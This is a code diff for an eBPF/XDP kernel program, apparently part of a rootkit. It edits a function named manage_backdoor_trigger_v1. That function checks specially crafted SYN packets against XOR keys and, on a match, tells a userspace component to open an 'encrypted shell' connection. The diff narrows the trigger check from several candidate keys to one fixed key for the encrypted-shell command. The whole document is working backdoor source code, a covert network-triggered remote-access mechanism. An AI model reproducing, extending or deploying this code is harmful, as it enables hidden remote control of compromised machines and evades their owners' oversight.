@@ -26,7 +26,6 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     //Loading keys
     __builtin_memcpy(key1, CC_TRIGGER_SYN_PACKET_KEY_1, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     __builtin_memcpy(key2, CC_TRIGGER_SYN_PACKET_KEY_2, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
     //S1 XOR K1
     __builtin_memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
@@ -56,21 +55,17 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     __builtin_memcpy(section3, payload+0x0C, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     int correct = 1;
     int command_received = -1;
-    for(int jj=0; jj<CC_PROT_K3_TOTAL_DEFINED_KEYS_V1; jj++){
-        for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
-            result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
-            if(result3[ii]!=(key3[ii] + jj)){
-                correct = 0;
-            }
+    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
+        if(result3[ii]!=(key3[ii])){
+            correct = 0;
         }
-        if(correct == 1){
-            //Found valid k3 value
-            command_received = jj;
-            break;
-        }
-        
     }
-    if(correct == 0){
+    if(correct == 1){
+        //Found valid k3 value
+        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
+    }else{
         bpf_printk("FAIL CHECK 3\n");
         return XDP_PASS;
     }
@@ -79,7 +74,7 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
     bpf_printk("Finished backdoor V1 check with success\n");
     int pid = -1; //Received by network stack, just ignore
     switch(command_received){
-        case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
+        case CC_PROT_COMMAND_ENCRYPTED_SHELL:
             bpf_printk("Received request to start encrypted connection\n");
             ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
             break;
